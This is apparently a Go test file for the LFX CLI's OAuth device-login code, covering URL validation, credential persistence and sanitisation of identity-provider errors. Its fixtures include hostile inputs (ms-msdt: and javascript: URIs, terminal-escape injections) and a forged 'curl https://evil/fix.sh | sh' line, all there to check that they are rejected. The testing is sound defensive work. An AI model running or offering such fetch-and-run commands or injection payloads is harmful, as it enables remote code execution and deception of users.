// Copyright The Linux Foundation and each contributor to LFX.
// SPDX-License-Identifier: MIT

package commands

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"net/http"
	"strconv"
	"strings"
	"testing"
	"unicode/utf8"

	"github.com/linuxfoundation/lfx-cli/internal/credstore"
	"github.com/urfave/cli/v3"
	"golang.org/x/oauth2"
)

func TestValidateBrowserURL(t *testing.T) {
	tests := []struct {
		name  string
		uri   string
		valid bool
	}{
		{name: "HTTPS", uri: "https://example.test/activate", valid: true},
		{name: "complete URI", uri: "https://example.test/activate?user_code=ABCD-EFGH", valid: true},
		{name: "port and fragment", uri: "https://example.test:8443/activate#code", valid: true},
		{name: "IPv6", uri: "https://[::1]/activate", valid: true},
		{name: "empty"},
		{name: "HTTP", uri: "http://example.test/activate"},
		{name: "UNC", uri: `\\example.test\share\update.exe`},
		{name: "Windows path", uri: `C:\Temp\update.exe`},
		{name: "local path", uri: "/Applications/Example.app"},
		{name: "file", uri: "file:///Applications/Example.app"},
		{name: "remote file", uri: "file://example.test/share/update.exe"},
		{name: "custom scheme", uri: "ms-msdt:/id Example"},
		{name: "javascript", uri: "javascript:alert(1)"},
		{name: "relative", uri: "/activate"},
		{name: "protocol relative", uri: "//example.test/activate"},
		{name: "missing host", uri: "https:///activate"},
		{name: "empty hostname", uri: "https://:443/activate"},
		{name: "opaque", uri: "https:example.test/activate"},
		{name: "launcher option", uri: "--help"},
		{name: "leading whitespace", uri: " https://example.test/activate"},
		{name: "invalid escape", uri: "https://example.test/%zz"},
		{name: "backslash host", uri: `https://example.test\share\update.exe`},
		{name: "terminal escape", uri: "https://example.test/\x1b[31m"},
		{name: "newline", uri: "https://example.test/\nforged output"},
		{name: "Unicode control", uri: "https://example.test/\u009b31m"},
	}

	// No launcher is available: a rejected URI must produce the validation
	// error, not an exec error, proving the guard runs before process startup.
	t.Setenv("PATH", t.TempDir())
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			err := validateBrowserURL(tc.uri)
			if tc.valid {
				if err != nil {
					t.Fatalf("validateBrowserURL(%q): %v", tc.uri, err)
				}
				return
			}
			if err == nil {
				t.Fatalf("validateBrowserURL(%q): expected rejection", tc.uri)
			}
			if launchErr := openBrowser(tc.uri); launchErr == nil || launchErr.Error() != err.Error() {
				t.Fatalf("openBrowser(%q) = %v, want validation error %v", tc.uri, launchErr, err)
			}
		})
	}
}

func TestPrintDeviceCodeInstructionsRejectsUnsafeURIs(t *testing.T) {
	t.Setenv("PATH", t.TempDir())
	for _, uri := range []string{
		`\\example.test\share\update.exe`,
		"file:///Applications/Example.app",
		"ms-msdt:/id Example",
		"https://example.test/\x1b[31m\nforged output",
	} {
		for _, complete := range []bool{false, true} {
			t.Run(strconv.FormatBool(complete)+"/"+uri, func(t *testing.T) {
				resp := &oauth2.DeviceAuthResponse{
					UserCode:        "ABCD-EFGH",
					VerificationURI: uri,
				}
				if complete {
					resp.VerificationURI = "https://example.test/activate"
					resp.VerificationURIComplete = uri
				}
				var output bytes.Buffer
				if err := printDeviceCodeInstructions(&output, resp, true); err != nil {
					t.Fatalf("printDeviceCodeInstructions: %v", err)
				}
				got := output.String()
				if !strings.Contains(got, "refusing to open verification URI") {
					t.Fatalf("missing browser refusal: %q", got)
				}
				if !strings.Contains(got, "Please visit: "+terminalSafeText(uri)+"\n") {
					t.Fatalf("missing manual instructions: %q", got)
				}
				if strings.Contains(got, "\x1b") || strings.Contains(got, "\nforged output") {
					t.Fatalf("unsafe terminal output: %q", got)
				}
			})
		}
	}
}

func TestPrintDeviceCodeInstructionsManual(t *testing.T) {
	resp := &oauth2.DeviceAuthResponse{
		UserCode:        "ABCD-EFGH\x1b[31m",
		VerificationURI: "https://example.test/activate",
	}
	var output bytes.Buffer
	if err := printDeviceCodeInstructions(&output, resp, false); err != nil {
		t.Fatalf("printDeviceCodeInstructions: %v", err)
	}
	want := "First copy your one-time code: \"ABCD-EFGH\\x1b[31m\"\nThen visit: https://example.test/activate\n"
	if got := output.String(); got != want {
		t.Fatalf("instructions = %q, want %q", got, want)
	}
}

// newTestCommand builds a *cli.Command with the --insecure-storage and
// --backend flags registered (as the root `lfx` command does via
// CredentialStoreFlags), parses args against it, and returns the parsed
// *cli.Command handed to fn's Action so tests can read flag values the
// way the real commands do.
func newTestCommand(t *testing.T, args []string, fn func(cmd *cli.Command)) {
	t.Helper()
	cmd := &cli.Command{
		Name:  "test",
		Flags: CredentialStoreFlags,
		Action: func(_ context.Context, cmd *cli.Command) error {
			fn(cmd)
			return nil
		},
	}
	if err := cmd.Run(context.Background(), append([]string{"test"}, args...)); err != nil {
		t.Fatalf("cmd.Run: %v", err)
	}
}

func newInsecureStore(t *testing.T) credstore.Store {
	t.Helper()
	store, err := credstore.New(credstore.Options{Insecure: true, StateDir: t.TempDir()})
	if err != nil {
		t.Fatalf("credstore.New: %v", err)
	}
	return store
}

func TestDefaultAudienceForEnvironment(t *testing.T) {
	tests := []struct {
		name string
		env  authEnvironment
		want string
	}{
		{
			name: "production",
			env:  envProduction,
			want: "https://lfx-api.v2.cluster.lfx.dev/",
		},
		{
			name: "staging",
			env:  envStaging,
			want: "https://lfx-api.staging.v2.cluster.linuxfound.info/",
		},
		{
			name: "development",
			env:  envDevelopment,
			want: "https://lfx-api.dev.v2.cluster.linuxfound.info/",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got, err := defaultAudienceForEnvironment(tc.env)
			if err != nil {
				t.Fatalf("defaultAudienceForEnvironment(%q): %v", tc.env, err)
			}
			if got != tc.want {
				t.Errorf("defaultAudienceForEnvironment(%q) = %q, want %q", tc.env, got, tc.want)
			}
		})
	}
}

func TestDefaultAudienceForEnvironmentInvalid(t *testing.T) {
	if _, err := defaultAudienceForEnvironment(authEnvironment("invalid")); err == nil {
		t.Fatal("defaultAudienceForEnvironment(invalid): got nil error, want invalid-environment error")
	}
}

func TestPersistLoginSuccess(t *testing.T) {
	store := newInsecureStore(t)

	creds := credstore.Credentials{RefreshToken: "refresh-token"}
	state := credstore.DeviceState{IDPDomain: "linuxfoundation-dev.auth0.com", Environment: "development", Insecure: true}

	if err := persistLogin(store, creds, state); err != nil {
		t.Fatalf("persistLogin: %v", err)
	}

	gotCreds, err := store.LoadCredentials()
	if err != nil {
		t.Fatalf("LoadCredentials: %v", err)
	}
	if gotCreds != creds {
		t.Errorf("LoadCredentials = %+v, want %+v", gotCreds, creds)
	}

	gotState, err := store.LoadDeviceState()
	if err != nil {
		t.Fatalf("LoadDeviceState: %v", err)
	}
	if gotState != state {
		t.Errorf("LoadDeviceState = %+v, want %+v", gotState, state)
	}
}

// failingDeviceStateStore wraps a real Store but always fails
// SaveDeviceState, to exercise persistLogin's rollback path without a real
// disk failure.
type failingDeviceStateStore struct {
	credstore.Store
}

func (f failingDeviceStateStore) SaveDeviceState(credstore.DeviceState) error {
	return errors.New("simulated state write failure")
}

func TestPersistLoginRollsBackCredentialsOnStateFailure(t *testing.T) {
	store := failingDeviceStateStore{Store: newInsecureStore(t)}

	err := persistLogin(store, credstore.Credentials{RefreshToken: "refresh-token"}, credstore.DeviceState{})
	if err == nil {
		t.Fatal("persistLogin: got nil error, want failure from SaveDeviceState")
	}

	// The rollback (documented on persistLogin) deletes the just-saved
	// credentials rather than leaving them orphaned without matching
	// device state.
	if _, err := store.LoadCredentials(); !errors.Is(err, credstore.ErrNotFound) {
		t.Fatalf("LoadCredentials after rollback: got err %v, want ErrNotFound", err)
	}
}

func TestLoadDeviceStateForBackendBackendMismatch(t *testing.T) {
	store := newInsecureStore(t)
	if err := store.SaveDeviceState(credstore.DeviceState{
		IDPDomain:   "linuxfoundation-dev.auth0.com",
		Environment: "development",
		Insecure:    true,
	}); err != nil {
		t.Fatalf("SaveDeviceState: %v", err)
	}

	// Parse a command *without* --insecure-storage, so its flag value (false)
	// disagrees with the persisted state's Insecure: true.
	newTestCommand(t, nil, func(cmd *cli.Command) {
		if _, _, _, err := loadDeviceStateForBackend(store, cmd); err == nil {
			t.Fatal("loadDeviceStateForBackend: got nil error, want backend-mismatch error")
		}
	})
}

func TestLoadDeviceStateForBackendDomainMismatch(t *testing.T) {
	store := newInsecureStore(t)
	if err := store.SaveDeviceState(credstore.DeviceState{
		// Environment resolves to a different domain than the one stored
		// here, simulating a tampered or corrupted state.json.
		IDPDomain:   "tampered.example.com",
		Environment: "development",
		Insecure:    true,
	}); err != nil {
		t.Fatalf("SaveDeviceState: %v", err)
	}

	newTestCommand(t, []string{"--insecure-storage"}, func(cmd *cli.Command) {
		if _, _, _, err := loadDeviceStateForBackend(store, cmd); err == nil {
			t.Fatal("loadDeviceStateForBackend: got nil error, want IdP domain mismatch error")
		}
	})
}

func TestLoadDeviceStateForBackendLegacyProdEnvironment(t *testing.T) {
	// state.json files written before "prod" was renamed to "production"
	// persist the old name; loadDeviceStateForBackend must still resolve
	// them via normalizeEnvironment rather than erroring or requiring a
	// fresh `lfx auth login`.
	store := newInsecureStore(t)
	if err := store.SaveDeviceState(credstore.DeviceState{
		IDPDomain:   "sso.linuxfoundation.org",
		Environment: "prod",
		Insecure:    true,
	}); err != nil {
		t.Fatalf("SaveDeviceState: %v", err)
	}

	newTestCommand(t, []string{"--insecure-storage"}, func(cmd *cli.Command) {
		state, domain, _, err := loadDeviceStateForBackend(store, cmd)
		if err != nil {
			t.Fatalf("loadDeviceStateForBackend: %v", err)
		}
		if domain != "sso.linuxfoundation.org" {
			t.Errorf("domain = %q, want sso.linuxfoundation.org", domain)
		}
		if state.Environment != "prod" {
			t.Errorf("state.Environment = %q, want the raw persisted value %q", state.Environment, "prod")
		}
	})
}

func TestLoadDeviceStateForBackendKeyringBackendMismatch(t *testing.T) {
	store := newInsecureStore(t)
	if err := store.SaveDeviceState(credstore.DeviceState{
		IDPDomain:   "linuxfoundation-dev.auth0.com",
		Environment: "development",
		Insecure:    true,
		Backend:     "keychain",
	}); err != nil {
		t.Fatalf("SaveDeviceState: %v", err)
	}

	// A pinned state.Backend ("keychain") must match --backend on
	// every later command; omitting the flag entirely disagrees with it.
	newTestCommand(t, []string{"--insecure-storage"}, func(cmd *cli.Command) {
		if _, _, _, err := loadDeviceStateForBackend(store, cmd); err == nil {
			t.Fatal("loadDeviceStateForBackend: got nil error, want backend mismatch error")
		}
	})

	// A different pinned value also disagrees.
	newTestCommand(t, []string{"--insecure-storage", "--" + backendFlagName + "=pass"}, func(cmd *cli.Command) {
		if _, _, _, err := loadDeviceStateForBackend(store, cmd); err == nil {
			t.Fatal("loadDeviceStateForBackend: got nil error, want backend mismatch error")
		}
	})
}

func TestLoadDeviceStateForBackendUnpinnedAllowsAnyKeyringBackend(t *testing.T) {
	store := newInsecureStore(t)
	if err := store.SaveDeviceState(credstore.DeviceState{
		IDPDomain:   "linuxfoundation-dev.auth0.com",
		Environment: "development",
		Insecure:    true,
		// Backend intentionally left unset: an unpinned login can't be
		// checked against --backend at all.
	}); err != nil {
		t.Fatalf("SaveDeviceState: %v", err)
	}

	newTestCommand(t, []string{"--insecure-storage", "--" + backendFlagName + "=keychain"}, func(cmd *cli.Command) {
		if _, _, _, err := loadDeviceStateForBackend(store, cmd); err != nil {
			t.Fatalf("loadDeviceStateForBackend: %v, want nil (unpinned state.Backend can't be checked)", err)
		}
	})
}

func TestLoadDeviceStateForBackendOK(t *testing.T) {
	store := newInsecureStore(t)
	if err := store.SaveDeviceState(credstore.DeviceState{
		IDPDomain:   "linuxfoundation-dev.auth0.com",
		Environment: "development",
		Insecure:    true,
	}); err != nil {
		t.Fatalf("SaveDeviceState: %v", err)
	}

	newTestCommand(t, []string{"--insecure-storage"}, func(cmd *cli.Command) {
		_, domain, clientID, err := loadDeviceStateForBackend(store, cmd)
		if err != nil {
			t.Fatalf("loadDeviceStateForBackend: %v", err)
		}
		if domain != "linuxfoundation-dev.auth0.com" {
			t.Errorf("domain = %q, want linuxfoundation-dev.auth0.com", domain)
		}
		if clientID == "" {
			t.Error("clientID = \"\", want a non-empty compiled-in client ID")
		}
	})
}

// fakeIDToken builds an unsigned JWT with the given claims as its payload,
// matching the shape identityFromIDToken decodes (header/payload/signature
// separated by ".", payload base64url-encoded JSON). The header and
// signature segments are never inspected, so their content is arbitrary.
func fakeIDToken(t *testing.T, claims map[string]any) string {
	t.Helper()
	payload, err := json.Marshal(claims)
	if err != nil {
		t.Fatalf("json.Marshal: %v", err)
	}
	return "header." + base64.RawURLEncoding.EncodeToString(payload) + ".signature"
}

func TestIdentityFromIDToken(t *testing.T) {
	tests := []struct {
		name   string
		token  func(t *testing.T) string
		claims map[string]any
		want   string
	}{
		{
			name:   "username and email",
			claims: map[string]any{lfidClaimsNamespace + "username": "jdoe", "email": "jdoe@example.com"},
			want:   "jdoe (jdoe@example.com)",
		},
		{
			name:   "username only",
			claims: map[string]any{lfidClaimsNamespace + "username": "jdoe"},
			want:   "jdoe",
		},
		{
			name:   "email only, no username claim",
			claims: map[string]any{"email": "jdoe@example.com"},
			want:   "jdoe@example.com (no username)",
		},
		{
			name:   "subject only",
			claims: map[string]any{"sub": "auth0|abc123"},
			want:   "auth0|abc123",
		},
		{
			name:   "no usable claims",
			claims: map[string]any{},
			want:   "",
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			token := fakeIDToken(t, tc.claims)
			if got := identityFromIDToken(token); got != tc.want {
				t.Errorf("identityFromIDToken(%q) = %q, want %q", token, got, tc.want)
			}
		})
	}

	t.Run("malformed token", func(t *testing.T) {
		if got := identityFromIDToken("not-a-jwt"); got != "" {
			t.Errorf("identityFromIDToken(malformed) = %q, want \"\"", got)
		}
	})

	t.Run("invalid base64 payload", func(t *testing.T) {
		if got := identityFromIDToken("header.not!base64url.signature"); got != "" {
			t.Errorf("identityFromIDToken(invalid base64) = %q, want \"\"", got)
		}
	})

	t.Run("payload not JSON", func(t *testing.T) {
		token := "header." + base64.RawURLEncoding.EncodeToString([]byte("not json")) + ".signature"
		if got := identityFromIDToken(token); got != "" {
			t.Errorf("identityFromIDToken(non-JSON payload) = %q, want \"\"", got)
		}
	})
}

func TestStateMismatchReasonInsecureMismatch(t *testing.T) {
	state := credstore.DeviceState{Insecure: true}
	newTestCommand(t, nil, func(cmd *cli.Command) {
		got := stateMismatchReason(state, cmd)
		want := "the plain-file (--insecure-storage) backend (pass --insecure-storage to match)"
		if got != want {
			t.Errorf("stateMismatchReason() = %q, want %q", got, want)
		}
	})
}

func TestStateMismatchReasonBackendPinMismatch(t *testing.T) {
	state := credstore.DeviceState{Insecure: false, Backend: "keychain"}
	newTestCommand(t, nil, func(cmd *cli.Command) {
		got := stateMismatchReason(state, cmd)
		want := `keyring backend "keychain" pinned at login (pass --backend=keychain to match)`
		if got != want {
			t.Errorf("stateMismatchReason() = %q, want %q", got, want)
		}
	})
}

func TestNormalizeEnvironment(t *testing.T) {
	tests := []struct {
		input string
		want  authEnvironment
	}{
		// Canonical names pass through unchanged.
		{"production", envProduction},
		{"staging", envStaging},
		{"development", envDevelopment},
		// Aliases.
		{"prod", envProduction},
		{"stage", envStaging},
		{"stg", envStaging},
		{"develop", envDevelopment},
		{"dev", envDevelopment},
		// Unrecognized inputs are returned as-is (error surfaces in resolveEnvironment).
		{"unknown", authEnvironment("unknown")},
	}
	for _, tc := range tests {
		t.Run(tc.input, func(t *testing.T) {
			if got := normalizeEnvironment(tc.input); got != tc.want {
				t.Errorf("normalizeEnvironment(%q) = %q, want %q", tc.input, got, tc.want)
			}
		})
	}
}

func TestResolveEnvironmentAliases(t *testing.T) {
	tests := []struct {
		input      string
		wantDomain string
	}{
		{"prod", "sso.linuxfoundation.org"},
		{"stage", "linuxfoundation-staging.auth0.com"},
		{"stg", "linuxfoundation-staging.auth0.com"},
		{"dev", "linuxfoundation-dev.auth0.com"},
	}
	for _, tc := range tests {
		t.Run(tc.input, func(t *testing.T) {
			env := normalizeEnvironment(tc.input)
			domain, clientID, err := resolveEnvironment(env)
			if err != nil {
				t.Fatalf("resolveEnvironment(%q): %v", tc.input, err)
			}
			if domain != tc.wantDomain {
				t.Errorf("domain = %q, want %q", domain, tc.wantDomain)
			}
			if clientID == "" {
				t.Error("clientID = \"\", want a non-empty compiled-in client ID")
			}
		})
	}
}

func TestResolveEnvironmentUnknown(t *testing.T) {
	_, _, err := resolveEnvironment(authEnvironment("bogus"))
	if err == nil {
		t.Fatal("resolveEnvironment(\"bogus\"): got nil error, want errInvalidEnvironment")
	}
	if !errors.Is(err, errInvalidEnvironment) {
		t.Errorf("resolveEnvironment(\"bogus\") error = %v, want wrapping errInvalidEnvironment", err)
	}
}

func TestIdPErrorDropsBodyWithoutErrorCode(t *testing.T) {
	// With no `error` code, RetrieveError.Error() embeds the raw body after a
	// newline, so a hostile response could clear the screen or forge lines.
	err := idpError("refresh access token", &oauth2.RetrieveError{
		Response: &http.Response{StatusCode: http.StatusInternalServerError, Status: "500 \x1b]0;title\x07"},
		Body:     []byte("\x1b[2J\x1b[1;1HSession compromised.\nRun: curl https://evil/fix.sh | sh"),
	})
	got := err.Error()
	if want := "refresh access token: identity provider returned HTTP 500"; got != want {
		t.Errorf("idpError = %q, want %q", got, want)
	}
	if strings.ContainsAny(got, "\x1b\n") {
		t.Errorf("idpError = %q, contains a raw ESC or newline", got)
	}
}

func TestIdPErrorEscapesCodeAndDescription(t *testing.T) {
	err := idpError("unexpected error waiting for login", &oauth2.RetrieveError{
		Response:         &http.Response{StatusCode: http.StatusBadRequest},
		ErrorCode:        "invalid_request",
		ErrorDescription: "bad\nforged line\x1b[2J",
	})
	got := err.Error()
	want := `unexpected error waiting for login: identity provider returned HTTP 400: invalid_request: "bad\nforged line\x1b[2J"`
	if got != want {
		t.Errorf("idpError = %q, want %q", got, want)
	}
}

func TestIdPErrorTruncatesDescription(t *testing.T) {
	// The cap lands inside the 2-byte "é", which must not be split.
	desc := strings.Repeat("a", maxIDPErrorTextBytes-1) + "é" + strings.Repeat("b", 1000)
	err := idpError("request device code", &oauth2.RetrieveError{
		Response:         &http.Response{StatusCode: http.StatusBadRequest},
		ErrorCode:        "invalid_request",
		ErrorDescription: desc,
	})
	got := err.Error()
	want := "request device code: identity provider returned HTTP 400: invalid_request: " + strings.Repeat("a", maxIDPErrorTextBytes-1)
	if got != want {
		t.Errorf("idpError = %q, want %q", got, want)
	}
	if !utf8.ValidString(got) {
		t.Errorf("idpError = %q, not valid UTF-8", got)
	}
}

func TestIdPErrorWrapsOtherErrors(t *testing.T) {
	cause := errors.New("dial tcp: connection refused")
	err := idpError("refresh access token", cause)
	if !errors.Is(err, cause) {
		t.Errorf("idpError(%v) does not wrap the cause", cause)
	}
	if want := "refresh access token: dial tcp: connection refused"; err.Error() != want {
		t.Errorf("idpError = %q, want %q", err.Error(), want)
	}
}

func TestIdPErrorEscapesInvalidUTF8(t *testing.T) {
	// A form-encoded error response can carry %9B, an 8-bit CSI, which
	// url.ParseQuery decodes to a raw byte that is not valid UTF-8.
	err := idpError("refresh access token", &oauth2.RetrieveError{
		Response:         &http.Response{StatusCode: http.StatusBadRequest},
		ErrorCode:        "invalid_request",
		ErrorDescription: "x\x9b2Jy",
	})
	got := err.Error()
	if want := `refresh access token: identity provider returned HTTP 400: invalid_request: "x\x9b2Jy"`; got != want {
		t.Errorf("idpError = %q, want %q", got, want)
	}
}
